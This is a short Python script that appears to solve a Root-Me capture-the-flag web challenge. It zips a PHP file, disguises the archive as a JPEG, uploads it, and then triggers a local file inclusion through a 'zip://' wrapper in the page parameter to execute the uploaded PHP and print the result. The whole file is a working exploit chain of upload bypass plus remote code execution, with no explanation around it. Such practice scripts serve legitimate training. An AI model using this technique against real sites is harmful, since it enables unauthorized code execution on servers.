#!/usr/bin/python3 env
import urllib2
import requests
import base64
from zipfile import ZipFile
from bs4 import BeautifulSoup

url = "http://challenge01.root-me.org/web-serveur/ch43/index.php?page=upload"

filename = 'a.jpg'

with ZipFile(filename,'w') as myzip:
	myzip.write('a.php');

with open(filename,'rb') as f:
	dataout = f.read()

files = {'fileToUpload': (filename,dataout)}
data = {'submit':'submit'}

s = requests.session()
r = s.post(url, files=files,data=data )

soup = BeautifulSoup(r.content,'html.parser')
path = soup.find("img").get("src")

payload = 'zip://'+path+'%23a'
newurl = "http://challenge01.root-me.org/web-serveur/ch43/index.php?page="+payload

getdata = s.get(newurl)
newsoup = BeautifulSoup(getdata.content,'html.parser')

print newsoup.text+"\n"